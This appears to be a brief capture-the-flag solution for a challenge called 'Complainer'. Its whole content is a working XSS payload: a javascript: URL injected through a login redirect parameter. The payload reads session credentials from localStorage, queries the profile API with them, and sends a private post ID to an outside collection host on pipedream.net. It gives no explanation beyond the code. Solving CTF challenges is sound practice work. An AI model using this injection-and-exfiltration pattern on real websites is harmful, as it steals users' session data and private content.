# Complainer


```js
https://complainer.tjc.tf/login?next=javascript:fetch(`/api/profile`, {
    method: 'GET',
    headers: {
        'Authorization': `Bearer ${localStorage.getItem('userId')}:${localStorage.getItem('sessionId')}`
    }
}).then(res => res.json())
  .then(res => {
    console.log(res.user.posts[0].id);
    return res.user.posts[0].id;
  })
  .then(id => {
    const encodedId = encodeURIComponent(id);
    location.href = `https://enxh1c9lp9m1.x.pipedream.net/?id=${encodedId}`;
});
```

`https://complainer.tjc.tf/post/id_leak`